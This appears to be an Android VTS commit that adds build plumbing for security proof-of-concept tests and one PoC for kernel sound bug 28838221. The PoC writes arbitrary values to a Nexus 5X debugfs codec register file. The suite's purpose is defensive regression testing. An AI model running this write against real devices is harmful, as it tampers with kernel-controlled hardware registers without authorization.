b944ac01a8fed6e3871bd8fc38454ea74aa18c39
Tri Vo <trong@google.com>
2016-10-15 16:19:09 -0700

    Basic infra to run PoC tests using VTS.
    Test: manual
    Change-Id: Id54446a7d69b958f43178df5d313b6c5c4e01351

---
+++ testcases/security/poc/target/Android.vts_testcase.mk
@@ -0,0 +1,35 @@
+#
+# Copyright (C) 2016 The Android Open Source Project
+#
+# Licensed under the Apache License, Version 2.0 (the "License");
+# you may not use this file except in compliance with the License.
+# You may obtain a copy of the License at
+#
+#      http://www.apache.org/licenses/LICENSE-2.0
+#
+# Unless required by applicable law or agreed to in writing, software
+# distributed under the License is distributed on an "AS IS" BASIS,
+# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+# See the License for the specific language governing permissions and
+# limitations under the License.
+#
+
+VTS_TESTCASES_OUT := $(HOST_OUT)/vts/android-vts/testcases
+
+# Copy test executable.
+vts_src_file := $(TARGET_OUT_DATA_NATIVE_TESTS)/$(module_path)/$(module_name)
+vts_dst_file := $(VTS_TESTCASES_OUT)/$(module_path)/$(module_name)
+
+$(vts_dst_file): $(vts_src_file) | $(ACP)
+	$(hide) mkdir -p $(dir $(vts_dst_file))
+	$(hide) $(ACP) -fp $< $@
+vts: $(vts_dst_file)
+
+# Copy test config.
+vts_src_file := $(poc_target_dir)/$(dir $(module_testname))/$(module_name)/poc.config
+vts_dst_file := $(VTS_TESTCASES_OUT)/$(module_path)/$(module_name).config
+
+$(vts_dst_file): $(vts_src_file) | $(ACP)
+	$(hide) mkdir -p $(dir $(vts_dst_file))
+	$(hide) $(ACP) -fp $< $@
+vts: $(vts_dst_file)
---
+++ testcases/security/poc/target/kernel_sound/28838221/poc.c
@@ -0,0 +1,48 @@
+#include "poc_test.h"
+
+#include <asm/ioctl.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#define SIZE 32
+
+int main(int argc, char* argv[]) {
+  VtsHostInput host_input = ParseVtsHostFlags(argc, argv);
+  const char* path;
+  switch(host_input.device_model) {
+    case NEXUS_5X:
+      path = "/sys/kernel/debug/asoc/msm8994-tomtom-snd-card/snd-soc-dummy/codec_reg";
+      break;
+    default:
+      return POC_TEST_FAIL;
+  }
+
+  int ret;
+  int fd;
+  char buf[SIZE] = {0};
+
+  fd = open(path, O_RDWR);
+  if (fd < 0) {
+    perror("open fail");
+    return POC_TEST_FAIL;
+  }
+  printf("open %s succ\n", path);
+
+  sprintf(buf, "%x %x", 0x1111111, 0x2222222);
+  ret = write(fd, buf, SIZE);
+  if (ret < 0) {
+    perror("write fail");
+    return POC_TEST_FAIL;
+  } else {
+    printf("succ write %d byte\n", ret);
+  }
+  close(fd);
+
+  return POC_TEST_PASS;
+}
